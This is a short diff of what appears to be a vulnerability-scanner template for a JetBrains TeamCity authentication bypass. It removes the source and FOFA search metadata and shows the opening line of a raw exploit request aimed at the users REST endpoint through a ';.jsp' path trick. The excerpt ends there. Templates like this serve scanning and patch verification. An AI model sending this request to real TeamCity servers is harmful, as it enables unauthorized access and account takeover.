@@ -3,12 +3,8 @@ info:
   name: JetBrains TeamCity 身份验证绕过漏洞2
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mhsr0ckifd266033'
+  description: ''
   tags: unauth,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mhsr0ckifd266033
-    fofa: body="Log in to TeamCity"
 http:
 - raw:
   - 'POST /pwned?jsp=/app/rest/users;.jsp HTTP/1.1
